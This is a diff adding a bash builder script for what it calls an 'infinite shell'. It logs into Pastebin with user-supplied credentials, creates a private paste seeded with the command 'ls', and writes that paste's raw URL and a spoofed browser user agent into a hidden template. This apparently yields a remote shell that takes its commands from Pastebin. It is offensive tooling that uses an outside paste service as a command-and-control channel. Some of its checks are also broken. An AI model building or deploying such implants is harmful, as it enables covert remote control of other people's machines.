@@ -1,0 +1,88 @@
+#!/usr/bin/env bash
+
+usage_text="Usage: bash build url|key url_or_key [optional_user_agent]\n\n"
+usage_text+="Example: bash build url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n"
+usage_text+="Example: bash build key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
+
+if [[ "$#" != 2 ]]; then
+
+    echo -e $usage_text
+    exit
+fi
+
+
+if [[ "$1" != "url" && "$1" != "key" ]]; then
+    echo -e $usage_text
+    exit
+fi
+
+
+user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
+
+
+if [[ -n "$3" ]]; then
+
+    user_agent="$3"
+
+fi
+
+
+function user_key() {
+    curl -sS -X POST -d "api_dev_key=$3" -d "api_user_name=$1" -d "api_user_password=$2" "https://pastebin.com/api/api_login.php"
+}
+
+
+function check_api_resp() {
+    if [[ -z "$1" || "$1" =~ "^Bad API request" ]]; then
+        echo "$1"
+        exit
+    fi
+}
+
+
+content=$(cat .template)
+
+
+if [[ "$1" = "url" ]]; then
+
+    content=${content//url=/url=\"$2\"}
+    content=${content//useragent=/useragent=\"$user_agent\"}
+
+    echo "$content" >".infish"
+
+    exit
+
+elif
+    [[ "$1" = "key" ]]
+then
+
+    dev_key=$2
+
+    echo "Pastebin username: "
+    read username
+    echo "Pastebin password: "
+    read password
+    echo "New Paste name: "
+    read paste_name
+
+    if [[ -z "$username" || -z "password" ]]; then
+        exit
+    fi
+
+    api_user_key=$(user_key $username $password $dev_key)
+    check_api_resp $api_user_key
+
+    new_url=$(curl -sS -L -X POST -A "$user_agent" -d "api_dev_key=$dev_key" -d "api_user_key=$api_user_key" -d "api_paste_code=ls" -d "api_option=paste" -d "api_paste_name=$paste_name" -d "api_paste_private=1" "https://pastebin.com/api/api_post.php")
+
+    new_url=${new_url//https:\/\/pastebin.com/pastebin.com\/raw}
+
+    content=${content//url=/url=\"$new_url\"}
+    content=${content//useragent=/useragent=\"$user_agent\"}
+
+    echo "$content" >".infish"
+
+    echo -e "Successfully built infinite shell\n\n"
+
+    exit
+
+fi
